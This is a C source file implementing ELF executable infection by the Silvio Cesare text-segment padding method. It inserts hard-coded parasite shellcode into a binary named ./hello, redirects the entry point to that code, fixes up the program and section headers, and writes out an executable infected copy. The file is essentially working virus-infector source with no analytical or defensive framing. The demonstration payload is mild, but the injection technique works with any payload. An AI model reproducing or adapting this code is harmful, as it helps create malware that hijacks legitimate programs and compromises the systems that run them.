#include <stdio.h>
#include <stdlib.h>
#include "elf.h"
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define TMP "hello_infected"
#define JMP_PATCH_OFFSET 1

//char parasite_shellcode[] = "";
char parasite_shellcode[] = "\x68\x41\x41\x41\x41\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x68\x41\x41\x41\x41\x48\x89\xe6\x48\xc7\xc2\x04\x00\x00\x00\x0f\x05\x58\x58\xff\xd0";


void insert_parasite(char *hosts_name, size_t psize, size_t hsize,uint8_t *mem, size_t end_of_text, uint8_t *parasite, uint32_t jmp_code_offset, Elf64_Addr old_e_entry);
int silvio_text_infect(char* host, void* base, void* payload, size_t parasite_len);

int main(){
    FILE *file;
    int fd, i, c;
    struct stat statbuf;

    fd = open ("./hello", O_RDONLY);
    stat("./hello",&statbuf);
    int size = statbuf.st_size;
    char dest[size];
    c = read (fd, dest, size);
    silvio_text_infect("./hello", dest, parasite_shellcode, sizeof(parasite_shellcode));

    return 0;
}

int silvio_text_infect(char* host, void* base, void* payload, size_t parasite_len)
{
    Elf64_Addr old_e_entry;
    Elf64_Addr o_text_filesz;
    Elf64_Addr parasite_vaddr;
    uint64_t end_of_text;
    uint8_t *mem = (uint8_t *)base;
    uint8_t *parasite = (uint8_t *)payload;
	
	/*
	 * Update e_shoff
	 */
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
    ehdr->e_shoff += PAGE_SIZE;
    struct stat statbuf;

    /*
     * Adjust program headers
     */
    for (int i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD) {
			if (phdr[i].p_offset == 0) {
				o_text_filesz = phdr[i].p_filesz; // old .text section size
				end_of_text = phdr[i].p_offset + phdr[i].p_filesz; // end address of .text section
				parasite_vaddr = phdr[i].p_vaddr + o_text_filesz; // 
				old_e_entry = ehdr->e_entry; // old entry point
				ehdr->e_entry = parasite_vaddr; 
				phdr[i].p_filesz += parasite_len;
				phdr[i].p_memsz += parasite_len; // len of .text section in virtual memory
				for (int j = i + 1; j < ehdr->e_phnum; j++) {
					if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz) { // if the infected .text covering the next section,the next section need to fixed its offset
						phdr[j].p_offset += PAGE_SIZE;
					}
				}
			}
		break;
		}
    }

	/*
	 * Adjust section headers
	 */
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_addr > parasite_vaddr)
            shdr[i].sh_offset += PAGE_SIZE;
        else
            if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr)
                shdr[i].sh_size += parasite_len;
    }
    stat(host,&statbuf);
    int size = statbuf.st_size;
    insert_parasite(host, parasite_len, size, base, end_of_text, parasite, JMP_PATCH_OFFSET, old_e_entry);
    return 0;

}

void insert_parasite(char *hosts_name, size_t psize, size_t hsize,uint8_t *mem, size_t end_of_text, uint8_t *parasite, uint32_t jmp_code_offset, Elf64_Addr old_e_entry)
{
    int ofd;
    unsigned int c;
    int i, t = 0;
    int ret;

    ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC,S_IRUSR|S_IXUSR|S_IWUSR);
    ret = write (ofd, mem, end_of_text);
    *(uint32_t *) &parasite[jmp_code_offset] = old_e_entry;
    write (ofd, parasite, psize); // injection shellcode
    lseek (ofd, PAGE_SIZE - psize, SEEK_CUR);
    mem += end_of_text;
    unsigned int sum = end_of_text + PAGE_SIZE;
    unsigned int last_chunk = hsize - end_of_text;
    write (ofd, mem, last_chunk);
    close (ofd);
}
